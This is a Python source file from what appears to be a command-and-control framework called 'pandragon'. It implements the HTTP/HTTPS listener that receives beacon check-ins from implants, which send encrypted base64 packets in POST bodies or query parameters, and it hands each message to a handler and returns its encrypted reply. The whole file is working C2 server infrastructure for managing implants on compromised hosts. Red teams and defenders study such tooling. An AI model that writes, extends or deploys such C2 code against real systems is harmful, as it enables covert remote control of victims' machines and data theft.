"""
HTTP Transport Implementation

Handles beacon check-in over HTTP/HTTPS (malleable C2).
Bridges aiohttp request/responses with the transport handler interface.

Wire format (matches beacon winhttp.cpp):
    Beacon sends base64-encoded encrypted packet as POST body or GET query param.
    Server responds with base64-encoded encrypted packet as plain-text body.
"""

import logging
import uuid

from aiohttp import web

from .base import (
    TransportProtocol,
    TransportContext,
    TransportMessage,
    TransportResponse,
)


logger = logging.getLogger('pandragon.transports.http')


_MAX_BODY_SIZE = 10 * 1024 * 1024


class HTTPTransport:
    """
    HTTP/HTTPS transport for beacon communication.

    Wraps aiohttp request handling into the transport handler interface.
    Each incoming request is converted to a TransportMessage and dispatched
    to the registered ITransportHandler.

    Unlike TCPTransport, this does not manage its own listener lifecycle
    since aiohttp owns the HTTP server. Routes are registered directly
    on the aiohttp application.

    Example:
        transport = HTTPTransport()
        transport.set_handler(handler)
        app.router.add_route('GET', '/checkin', transport.handle_request)
        app.router.add_route('POST', '/checkin', transport.handle_request)
    """

    def __init__(self):
        self._handler = None

    def set_handler(self, handler):
        """Set the ITransportHandler for processing beacon messages."""
        self._handler = handler

    async def handle_request(self, request: web.Request) -> web.Response:
        """
        Handle incoming HTTP beacon check-in.

        Extracts the raw query from GET or body from POST, wraps it
        in a TransportMessage, dispatches to the handler, and returns
        the response as a plain-text HTTP response.

        Args:
            request: aiohttp Request object

        Returns:
            aiohttp Response with base64-encoded encrypted result
        """
        client_ip = request.remote or 'unknown'
        http_method = request.method

        if request.content_length is not None and request.content_length > _MAX_BODY_SIZE:
            logger.warning(f"Request body too large from {client_ip}: {request.content_length}")
            return web.Response(status=413, text="")

        if http_method == 'POST':
            raw_query = await request.read()
            if len(raw_query) > _MAX_BODY_SIZE:
                logger.warning(f"Request body too large from {client_ip}: {len(raw_query)} bytes")
                return web.Response(status=413, text="")
            raw_query = raw_query.strip()
            if not raw_query:
                return web.Response(status=400, text="")
        else:
            raw_query = request.query_string
            if not raw_query:
                return web.Response(status=400, text="")
            if isinstance(raw_query, str):
                raw_query = raw_query.encode('ascii')
            if b'=' in raw_query:
                raw_query = raw_query.split(b'=', 1)[1]

        if not self._handler:
            logger.error("HTTP transport handler not initialized")
            return web.Response(status=503, text="")

        # Determine payload location from HTTP method and query params
        if http_method == 'POST':
            payload_location = request.content_type if request.content_type else 'body'
        else:
            if request.query_string and '=' in request.query_string:
                payload_location = 'query_param'
            else:
                payload_location = 'path'

        context = TransportContext(
            client_id=str(uuid.uuid4())[:8],
            remote_addr=client_ip,
            protocol=TransportProtocol.HTTP,
            metadata={
                'user_agent': request.headers.get('User-Agent', ''),
                'path': request.path,
                'method': request.method,
                'payload_location': payload_location,
                'headers': dict(request.headers),
            },
        )
        message = TransportMessage(data=raw_query if isinstance(raw_query, bytes) else raw_query.encode('latin-1'), context=context)

        try:
            response = await self._handler.on_message(message)
        except Exception as e:
            logger.error(f"HTTP handler error: {e}")
            return web.Response(status=500, text="")

        if response is None or response.status_code != 200:
            return web.Response(status=response.status_code if response else 400, text="")

        return web.Response(body=response.data, content_type='text/plain')
